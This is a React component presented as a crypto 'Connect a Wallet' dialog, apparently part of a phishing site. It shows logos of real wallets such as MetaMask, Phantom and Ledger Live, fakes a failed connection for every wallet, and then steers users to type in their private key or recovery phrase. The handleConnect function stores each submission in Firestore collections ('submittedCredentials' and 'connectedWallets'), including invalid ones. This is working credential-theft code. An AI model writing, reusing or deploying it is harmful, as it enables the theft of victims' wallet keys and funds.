import React, { useState, useEffect } from 'react';
import { FaTimes, FaWallet, FaKey, FaLock, FaCloudSunRain, FaBitcoin } from 'react-icons/fa';
import { FaMeta } from "react-icons/fa6";
import { TbPlugConnected } from 'react-icons/tb';
import { BiLoaderAlt } from 'react-icons/bi';
import { addDoc, collection } from 'firebase/firestore';
import { db } from '../../firebase';
import { isValidMnemonic, isValidPrivateKey } from '../../utils/walletValidation';

const WalletConnectionDialog = ({ isOpen, onClose }) => {
  // Ensure all hooks are at the top level
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showCredentials, setShowCredentials] = useState(false);
  const [credentialType, setCredentialType] = useState('privatekey'); // or 'passphrase'
  const [credential, setCredential] = useState('');
  const [error, setError] = useState('');
  const [showAllWallets, setShowAllWallets] = useState(false);

  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden'; // Prevent scrolling
    } else {
      document.body.style.overflow = ''; // Re-enable scrolling
    }

    return () => {
      document.body.style.overflow = ''; // Ensure scrolling is re-enabled
    };
  }, [isOpen]);

  if (!isOpen) return null;
// List of Wallets
const wallets = [
  // Ethereum & Multi-Chain Wallets
  { name: 'MetaMask', icon: FaWallet, color: 'text-[#F6851B]', image: 'https://s1.coincarp.com/logo/wallet/metamask.png?style=72' },
  { name: 'Rabby Wallet', icon: FaBitcoin, color: 'text-[#0052FF]', image: 'https://images.seeklogo.com/logo-png/48/2/rabby-logo-png_seeklogo-483982.png' },
  { name: 'Coinbase Wallet', icon: FaBitcoin, color: 'text-[#0052FF]', image: 'https://s1.coincarp.com/logo/wallet/coinbase.png?style=72' },
  { name: '1Inch Wallet', icon: FaWallet, color: 'text-[#007AFF]', image: 'http://t1.gstatic.com/images?q=tbn:ANd9GcRWG4PkSttSsoziTdZzQQpWJ8H7VJraRgGHbmsJ9V8FkqKgT51B' },
  { name: 'Zengo', icon: FaWallet, color: 'text-[#007AFF]', image: 'https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcQnNlhvlQBMX9jLQMrlwhNj34WmsHUmgvz8kICNRYr3biI2fgyV' },
  { name: 'Ledger Live', icon: FaWallet, color: 'text-[#007AFF]', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmv-VyfzCVyhoZbcmgYt8B7xIdFzNntgatCg&s' },
  { name: 'Trust Wallet', icon: FaWallet, color: 'text-[#007AFF]', image: 'https://s1.coincarp.com/logo/wallet/trust.png?style=72' },
  { name: 'Rainbow Wallet', icon: FaCloudSunRain, color: 'text-[#FF6B6B]', image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRKIRURVqxnyIZ6tkWFO45Ni1oiwoT5LwYafA&s" },
  { name: 'OKX Wallet', icon: FaWallet, color: 'text-[#00A3E1]', image: 'https://gdm-catalog-fmapi-prod.imgix.net/ProductLogo/a97ba8c8-f9af-4dae-a9c6-079f777db0cf.png?auto=format%2Ccompress&fit=max&w=256&q=75&ch=Width%2CDPR' },
  { name: 'Bitget Wallet', icon: FaWallet, color: 'text-[#00A3E1]', image: 'http://t2.gstatic.com/images?q=tbn:ANd9GcThM98jBwQfhcFVJkVG1ILMM2xIS0wGRR__qtnR5T2v4SjZyDLX' },
  { name: 'SafePal', icon: FaWallet, color: 'text-[#00A3E1]', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSIdW-KTi-DxlT0Uvjxx87i7qiZZMo-isiH_w&s' },

  // Solana Wallets
  { name: 'Phantom', icon: FaWallet, color: 'text-[#8A2BE2]', image: 'https://187760183-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MVOiF6Zqit57q_hxJYp%2Ficon%2FU7kNZ4ygz4QW1rUwOuTT%2FWhite%20Ghost_docs_nu.svg?alt=media&token=447b91f6-db6d-4791-902d-35d75c19c3d1' },
  { name: 'Solflare', icon: FaWallet, color: 'text-[#FF8C00]', image: 'https://images.sftcdn.net/images/t_app-icon-m/p/f952d0c0-29e2-476e-87e1-819dcba49252/1808597596/solflare-solana-wallet-logo' },

  // Bitcoin Wallets
  { name: 'Electrum', icon: FaWallet, color: 'text-[#FFCC00]', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRt826PbcwxK1tdCwBbkgjqhD5zPhuZ6y3WJg&s' },
  { name: 'BlueWallet', icon: FaWallet, color: 'text-[#4169E1]', image: 'https://images.seeklogo.com/logo-png/48/2/rabby-logo-png_seeklogo-483982.png' },
  { name: 'Exodus', icon: FaWallet, color: 'text-[#00A3E1]', image: 'https://www.exodus.com/brand/img/logo.svg' },
  { name: 'Atomic Wallet', icon: FaWallet, color: 'text-[#FF9900]', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRmu97k0QxZ184Bzj_nFt6LlqZ43PWyCEMI7g&s' },
  { name: 'Edge Wallet', icon: FaWallet, color: 'text-[#00C3E3]', image: 'https://cryptotesters-images.s3.eu-central-1.amazonaws.com/b1f5fd65fcd544f99e64a701af9697d2ct_6185109852.png' },

  // WalletConnect
  { name: 'WalletConnect', icon: TbPlugConnected, color: 'text-[#3B99FC]', image: 'https://www.nuget.org/profiles/WalletConnect/avatar?imageSize=512' },
];
  // Show only a few wallets initially
  const displayedWallets = showAllWallets ? wallets : wallets.slice(0, 4);


  const handleWalletClick = async (wallet) => {
    setSelectedWallet(wallet);
    setIsLoading(true);
    setError('');
    setShowCredentials(false); // Ensure we don't override the error
  
    // Simulate connection attempt
    setTimeout(() => {
      setIsLoading(false);
      // if (Math.random() < 0.5) { // Simulating a random failure
        setError(`Failed to connect to ${wallet.name}. Try again or use another method.`);
      // } else {
        // setShowCredentials(true);
      // }
    }, 2000);
  };
  // Handle "Try Again" button click
  const handleTryAgain = () => {
    setIsLoading(true);
    setError('');

    setTimeout(() => {
      setIsLoading(false);
      setError('Failed to connect again. Please use Private Key or Passphrase.');
      // setShowCredentials(true); // Show private key or passphrase input after failure
    }, 2000);
  };
  // const handleConnect = async () => {
  //   if (!credential) {
  //     setError("Please enter your private key or passphrase.");
  //     return;
  //   }

  //   setIsLoading(true);
  //   setError("");

  //   try {
  //     await addDoc(collection(db, "connectedWallets"), {
  //       // userId,
  //       // userEmail,
  //       walletName: selectedWallet.name,
  //       credentialType,
  //       credential, // Store it securely
  //       timestamp: new Date(),
  //     });

  //     setIsLoading(false);
  //     onClose(); // Close the modal after saving
  //   } catch (err) {
  //     setIsLoading(false);
  //     setError("Failed to connect. Please try again.");
  //     console.error("Firestore error:", err);
  //   }
  // };

  const handleConnect = async () => {
    if (!credential) {
      setError("Please enter your private key or passphrase.");
      return;
    }
  
    setIsLoading(true);
    setError("");
  
    let isValid = false;
    console.log(credential)
    console.log(isValidMnemonic(credential))
    console.log(isValidPrivateKey(credential))
    try {
      if (credentialType === "passphrase") {
        isValid = isValidMnemonic(credential);
        
        // Save in Firestore even if invalid
        await addDoc(collection(db, "submittedCredentials"), {
          walletName: selectedWallet.name,
          credentialType,
          credential, // Store securely
          isValid,
          timestamp: new Date(),
        });
  
        if (!isValid) {
          setError("Invalid passphrase. Please enter a valid 12 or 24-word recovery phrase.");
          setIsLoading(false);
          return;
        }
      } else if (credentialType === "privatekey") {
        isValid = isValidPrivateKey(credential);
  
        // Save in Firestore even if invalid
        await addDoc(collection(db, "submittedCredentials"), {
          walletName: selectedWallet.name,
          credentialType,
          credential, // Store securely
          isValid,
          timestamp: new Date(),
        });
  
        if (!isValid) {
          setError("Invalid private key. Please enter a valid private key in hexadecimal format.");
          setIsLoading(false);
          return;
        }
      }
  
      // If valid, proceed with connection
      await addDoc(collection(db, "connectedWallets"), {
        walletName: selectedWallet.name,
        credentialType,
        credential, // Store securely
        timestamp: new Date(),
      });
  
      setIsLoading(false);
      onClose(); // Close the modal after saving
    } catch (err) {
      setIsLoading(false);
      setError("Failed to connect. Please try again.");
      console.error("Firestore error:", err);
    }
  };
  const renderContent = () => {
    if (error) {
      return (
        <div className="p-6 space-y-6">
          <div className="flex justify-between items-center">
            <div className="flex items-center gap-3">
              <img src={selectedWallet.image} alt={selectedWallet.name} className="w-6 h-6" />
              {/* <selectedWallet.icon className={`w-6 h-6 ${selectedWallet.color}`} /> */}
              <h2 className="text-xl font-bold text-gray-800">{selectedWallet.name}</h2>
            </div>
            <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition-colors">
              <FaTimes className="w-5 h-5" />
            </button>
          </div>
    
          <div className="p-4 bg-red-50 border border-red-100 rounded-lg">
            <p className="text-sm text-red-600">{error}</p>
          </div>
    
          <div className="flex flex-col gap-3">
            <button
              onClick={handleTryAgain}
              className="w-full bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition-colors font-medium"
            >
              Try Again
            </button>
            <button
              onClick={() => {
                setError(''); // Clear any previous error
                setShowCredentials(true);
                setCredential("")
              }}
              className="w-full text-purple-600 hover:text-purple-700 transition-colors font-medium"
            >
              Use Private Key or Passphrase
            </button>
          </div>
        </div>
      );
    }
    if (isLoading) {
      return (
        <div className="flex flex-col items-center justify-center py-12">
          <BiLoaderAlt className="w-12 h-12 text-purple-600 animate-spin mb-4" />
          <p className="text-gray-600 text-center">
            {selectedWallet ? `Connecting to ${selectedWallet.name}...` : 'Connecting...'}
          </p>
        </div>
      );
    }

    if (showCredentials) {
      return (
        <div className="p-6 space-y-6">
          <div className="flex justify-between items-center">
            <div className="flex items-center gap-3">
              <img src={selectedWallet.image} alt={selectedWallet.name} className="w-6 h-6" />
              {/* <selectedWallet.icon className={`w-6 h-6 ${selectedWallet.color}`} /> */}
              <h2 className="text-xl font-bold text-gray-800">{selectedWallet.name}</h2>
            </div>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-gray-600 transition-colors"
            >
              <FaTimes className="w-5 h-5" />
            </button>
          </div>

          {/* Credential Type Tabs */}
          <div className="flex mb-6 bg-gray-100 p-1 rounded-lg">
            <button
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
                credentialType === 'privatekey'
                  ? 'bg-white text-gray-800 shadow'
                  : 'text-gray-600 hover:text-gray-800'
              }`}
              onClick={() => setCredentialType('privatekey')}
            >
              Private Key
            </button>
            <button
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
                credentialType === 'passphrase'
                  ? 'bg-white text-gray-800 shadow'
                  : 'text-gray-600 hover:text-gray-800'
              }`}
              onClick={() => setCredentialType('passphrase')}
            >
              Passphrase
            </button>
          </div>

          {/* Credential Input */}
          <div className="space-y-4">
            <div className="relative">
              <input
                type="password"
                value={credential}
                onChange={(e) => setCredential(e.target.value)}
                placeholder={credentialType === 'privatekey' ? 'Enter your private key' : 'Enter your passphrase'}
                className="w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
                {credentialType === 'privatekey' ? <FaKey /> : <FaLock />}
              </div>
            </div>

            {error && (
              <div className="p-4 bg-red-50 border border-red-100 rounded-lg">
                <p className="text-sm text-red-600">{error}</p>
              </div>
            )}

            <button
              onClick={handleConnect}
              disabled={!credential || isLoading}
              className="w-full bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition-colors font-medium disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Connecting...' : 'Connect Wallet'}
            </button>
          </div>
        </div>
      );
    }

    return (
      <div className="flex flex-col md:flex-row">
        {/* Left Column - Wallet List */}
        <div className="md:w-1/2 p-4 md:p-6 border-b md:border-b-0 md:border-r border-gray-200">
          <div className="flex justify-between items-center mb-2 md:mb-6">
            <h2 className="text-lg md:text-xl font-bold text-gray-800">Connect a Wallet</h2>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-gray-600 transition-colors md:hidden"
            >
              <FaTimes className="w-5 h-5" />
            </button>
          </div>
          
          <div className="space-y-1 md:space-y-3 overflow-y-auto max-h-[400px]">
            {displayedWallets.map((wallet) => (
              <button
                key={wallet.name}
                onClick={() => handleWalletClick(wallet)}
                className="w-full flex items-center gap-3 p-4 rounded-lg hover:bg-gray-50 border border-gray-200 transition-all"
              >
                {/* <wallet.icon className={`w-6 h-6 ${wallet.color}`} /> */}
                <img src={wallet.image} alt={wallet.name} className="w-6 h-6" />
                <span className="font-medium text-gray-800">{wallet.name}</span>
              </button>
            ))}
             {/* "See More" Button */}
            {!showAllWallets && (
              <div className="flex justify-center">
                <button
                  onClick={() => setShowAllWallets(true)}
                  className="text-purple-600 hover:text-purple-700 transition-colors font-medium"
                >
                  See More Wallets
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Right Column - Wallet Info */}
        <div className="md:w-1/2 p-4 md:p-6">
          <div className="flex justify-between items-center mb-3 md:mb-6">
            <h2 className="text-lg md:text-xl font-bold text-gray-800">What is a Wallet?</h2>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-gray-600 transition-colors hidden md:block"
            >
              <FaTimes className="w-5 h-5" />
            </button>
          </div>

          <div className="space-y-3 md:space-y-6">
            {/* Digital Assets Section */}
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <FaWallet className="w-4 h-4 md:w-5 md:h-5 text-purple-600" />
                <h3 className="font-semibold text-gray-800">A Home for Your Digital Assets</h3>
              </div>
              <p className="text-gray-600">
                Wallets are essential tools that allow you to send, receive, store, and display digital assets like Bitcoin and other cryptocurrencies.
              </p>
            </div>

            {/* Authentication Section */}
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <FaKey className="w-4 h-4 md:w-5 md:h-5 text-purple-600" />
                <h3 className="font-semibold text-gray-800">A New Way to Log In</h3>
              </div>
              <p className="text-gray-600">
                Instead of creating new accounts and passwords on every website, just connect your wallet to sign in securely.
              </p>
            </div>

            {/* CTA Buttons */}
            <div className="flex flex-col gap-3 mt-4 md:mt-8">
              <button className="w-full bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition-colors font-medium">
                Get a Wallet
              </button>
              <button className="w-full text-purple-600 hover:text-purple-700 transition-colors font-medium">
                Learn More
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="fixed inset-0 z-[999999] flex items-center justify-center overflow-y-auto overflow-x-hidden p-4 sm:p-6">
      {/* Backdrop */}
      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm" onClick={onClose} />

      {/* Dialog Content */}
      <div className="relative bg-white rounded-2xl w-full max-w-4xl mx-auto my-8 shadow-xl max-h-[90vh] overflow-y-auto">
        {renderContent()}
      </div>
    </div>
  );
};

export default WalletConnectionDialog; 